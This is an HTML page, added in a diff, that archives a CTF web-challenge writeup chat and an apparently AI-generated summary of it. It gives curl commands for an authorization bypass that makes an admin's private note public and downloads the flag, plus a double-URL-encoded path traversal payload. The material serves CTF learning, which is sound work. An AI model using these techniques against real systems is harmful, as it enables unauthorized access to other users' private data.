@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CTFdi</title>
+  <style>
+    :root {
+        --primary: #ff2e63;   /* neon red/pink */
+        --secondary: #162447;
+        --accent: #08d9d6;    /* neon blue/cyan */
+        --background: #0a0a0f;
+        --surface: rgba(20, 20, 40, 0.9);
+        --text: #e6f1ff;
+    }
+
+    body {
+        font-family: 'Press Start 2P', monospace;
+        background-color: var(--background);
+        color: var(--text);
+        margin: 0;
+        padding: 20px;
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        font-size: 14px; /* bigger font */
+    }
+
+    .chat {
+        width: 100%;
+        max-width: 800px;
+        height: 500px;
+        overflow-y: auto;
+        background: var(--surface);
+        border-radius: 8px;
+        box-shadow: 0 0 25px rgba(255, 46, 99, 0.3);
+        padding: 12px;
+        display: flex;
+        flex-direction: column-reverse;
+    }
+
+    .message {
+        margin: 12px 0;
+        padding: 10px;
+        border-radius: 6px;
+        background: rgba(15, 15, 25, 0.85);
+        box-shadow: 0 0 6px rgba(8, 217, 214, 0.3);
+        font-size: 14px;
+        line-height: 1.5;
+    }
+
+    .timestamp {
+        font-size: 11px;
+        color: var(--primary); /* red timestamps */
+        margin-bottom: 4px;
+        display: block;
+        opacity: 0.55;
+    }
+
+    #summary {
+        width: 100%;
+        max-width: 800px;
+        margin: 30px auto;
+        padding: 20px;
+        background: var(--surface);
+        line-height: 1.6;
+        border-radius: 8px;
+        box-shadow: 0 0 20px rgba(8, 217, 214, 0.3);
+        font-size: 14px;
+    }
+
+    .content a {
+        color: var(--accent); /* blue links */
+        text-decoration: none;
+        font-weight: bold;
+    }
+
+    .content a:hover {
+        opacity: 0.8;
+        text-decoration: underline;
+    }
+
+    /* CRT scanline effect */
+    .scanline {
+        background: linear-gradient(to bottom,
+            rgba(255, 255, 255, 0) 0%,
+            rgba(255, 255, 255, 0.05) 10%,
+            rgba(255, 255, 255, 0) 100%);
+        animation: scanline 8s linear infinite;
+        pointer-events: none;
+    }
+
+    @keyframes scanline {
+        0% { transform: translateY(-100%); }
+        100% { transform: translateY(100%); }
+    }
+</style>
+</head>
+<body>
+  <h1>Channel: [data/ctfs/kctf25/web_1411344120273702932.json]</h1>
+  <h3>Writeup Chat</h3>
+  <div id="chat" class="chat">
+    <div class="message">
+      <span class="timestamp">2025-09-01T08:11:24.355000+00:00</span>
+      <div class="content">photo stock 
+
+```sh
+curl -s -X PATCH "<a href="https://target/api/notes/public"" target="_blank">https://target/api/notes/public"</a> \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  --data "{\"_json\":[],\"id\":\"$ID\"}" -i
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-31T12:26:41.698000+00:00</span>
+      <div class="content">## photo stock
+
+- found the seed data showing admin user "administrator" with note "mvp_note"
+- login and see notes and found admin's note ID: `b75c4dcf-ef7a-48db-be16-3bdc4017367d` with status: "privacy":"private"
+- then create own note
+- exploit inconsistent authorization logic
+```
+curl -X PATCH '<a href="https://[target]/api/notes/public?id=b75c4dcf-ef7a-48db-be16-3bdc4017367d'" target="_blank">https://[target]/api/notes/public?id=b75c4dcf-ef7a-48db-be16-3bdc4017367d'</a> \
+  -H 'Authorization: Bearer [token]' \
+  -d '["&lt;own_note_id&gt;"]'
+```
+- access flag
+```
+curl -H "Authorization: Bearer [token]" \
+  <a href="https://[target]/api/notes/b75c4dcf-ef7a-48db-be16-3bdc4017367d/image" target="_blank">https://[target]/api/notes/b75c4dcf-ef7a-48db-be16-3bdc4017367d/image</a> \
+  --output flag.jpg
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-31T12:26:33.098000+00:00</span>
+      <div class="content"><a href="https://gist.github.com/as3617/847b23be47633b9e626bc404458deef6" target="_blank">https://gist.github.com/as3617/847b23be47633b9e626bc404458deef6</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-31T12:23:49.367000+00:00</span>
+      <div class="content">we can just double url encode (`<a href="http://127.0.0.1/post/b2fb3a32-f233-4ea8-a5bb-23d8e5e9ed97/posts/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fdrafts%252fsave`)" target="_blank">http://127.0.0.1/post/b2fb3a32-f233-4ea8-a5bb-23d8e5e9ed97/posts/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fdrafts%252fsave`)</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-31T12:03:38.269000+00:00</span>
+      <div class="content"><a href="https://gist.github.com/as3617/25537beb3acaddc2ad4d025e6c08d29b" target="_blank">https://gist.github.com/as3617/25537beb3acaddc2ad4d025e6c08d29b</a>
+bubble rerevenge writeup here</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-31T06:56:44.145000+00:00</span>
+      <div class="content"><a href="https://tenor.com/view/ocean-park-roy-rooster-chicken-chiken-gif-7535742022430869314" target="_blank">https://tenor.com/view/ocean-park-roy-rooster-chicken-chiken-gif-7535742022430869314</a></div>
+    </div>
+  </div>
+  <h3>Gemini Chat Summary</h3>
+  <section id="summary">
+<div>
+    <h2>Vulnerability Exploit Summaries and Resources</h2>
+    <p>This document outlines two distinct web vulnerability exploits and provides a collection of related resources. The primary exploits discussed are an authorization bypass in a "photo stock" application and a path traversal vulnerability utilizing double URL encoding.</p>
+
+    <hr>
+
+    <h3>1. Photo Stock: Authorization Bypass Exploit</h3>
+    <p>This section details a multi-step exploit to access a private administrative note by taking advantage of inconsistent authorization logic in the target API.</p>
+    <h4>Summary of the Exploit Chain:</h4>
+    <ul>
+        <li><strong>Initial Discovery:</strong> Seed data revealed an administrative user named <code>administrator</code> with a private note identified by the ID <code>b75c4dcf-ef7a-48db-be16-3bdc4017367d</code>.</li>
+        <li><strong>Vulnerability:</strong> The application exhibits flawed authorization. A <code>PATCH</code> request to the <code>/api/notes/public</code> endpoint incorrectly validates permissions based on the note ID provided in the URL query string, rather than the one in the request body or the user's session context.</li>
+        <li><strong>Exploitation:</strong> An attacker can make the administrator's private note public by sending a crafted <code>PATCH</code> request. By placing the admin's note ID in the query string, the endpoint changes its status to public.</li>
+        <li><strong>Goal Achievement:</strong> Once the note is public, the associated image, containing the flag, can be downloaded.</li>
+    </ul>
+
+    <h4>Exploitation Steps &amp; Commands:</h4>
+    <ol>
+        <li>
+            <p><strong>Initial State:</strong> The administrator's note is private.</p>
+            <pre><code>curl -s -X PATCH "https://target/api/notes/public" \
+-H "Authorization: Bearer $TOKEN" \
+-H "Content-Type: application/json" \
+--data '{"_json":[],"id":"$ID"}' -i</code></pre>
+        </li>
+        <li>
+            <p><strong>Bypass Authorization:</strong> Craft a <code>PATCH</code> request using your own authentication token. Place the target admin note ID (<code>b75c4dcf-ef7a-48db-be16-3bdc4017367d</code>) in the query string. The request body can reference a note you own.</p>
+            <pre><code>curl -X PATCH 'https://[target]/api/notes/public?id=b75c4dcf-ef7a-48db-be16-3bdc4017367d' \
+-H 'Authorization: Bearer [token]' \
+-d '["&lt;own_note_id&gt;"]'</code></pre>
+        </li>
+        <li>
+            <p><strong>Access Flag:</strong> After the note is made public, download the associated image to retrieve the flag.</p>
+            <pre><code>curl -H "Authorization: Bearer [token]" \
+https://[target]/api/notes/b75c4dcf-ef7a-48db-be16-3bdc4017367d/image \
+--output flag.jpg</code></pre>
+        </li>
+    </ol>
+
+    <hr>
+
+    <h3>2. Path Traversal via Double URL Encoding</h3>
+    <p>A separate vulnerability was noted involving a path traversal attack. This technique uses double URL encoding to bypass security filters that might only decode the URL once.</p>
+    <ul>
+        <li><strong>Technique:</strong> The payload uses <code>%252e%252e%252f</code>, which is the double URL encoded form of <code>../</code>, to navigate the directory structure.</li>
+        <li><strong>Example Payload URL:</strong>
+            <pre><code>http://127.0.0.1/post/b2fb3a32-f233-4ea8-a5bb-23d8e5e9ed97/posts/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fdrafts%252fsave</code></pre>
+        </li>
+    </ul>
+
+    <hr>
+
+    <h3>3. External Resources</h3>
+    <p>The conversation included several links to external resources, likely containing further details, write-ups, or related context.</p>
+    <ul>
+        <li><strong>GitHub Gists:</strong>
+            <ul>
+                <li><a href="https://gist.github.com/as3617/847b23be47633b9e626bc404458deef6" target="_blank" rel="noopener noreferrer">https://gist.github.com/as3617/847b23be47633b9e626bc404458deef6</a></li>
+                <li><a href="https://gist.github.com/as3617/25537beb3acaddc2ad4d025e6c08d29b" target="_blank" rel="noopener noreferrer">https://gist.github.com/as3617/25537beb3acaddc2ad4d025e6c08d29b</a></li>
+            </ul>
+        </li>
+        <li><strong>Write-up:</strong> A reference was made to a "bubble rerevenge writeup".</li>
+        <li><strong>Miscellaneous:</strong>
+            <ul>
+                <li><a href="https://tenor.com/view/ocean-park-roy-rooster-chicken-chiken-gif-7535742022430869314" target="_blank" rel="noopener noreferrer">Tenor GIF Link</a></li>
+            </ul>
+        </li>
+    </ul>
+</div>
+  </section>
+  <script>
+    // Force chat to start at the bottom (newest messages)
+    const chat = document.getElementById("chat");
+    chat.scrollTop = chat.scrollHeight;
+  </script>
+</body>
+</html>
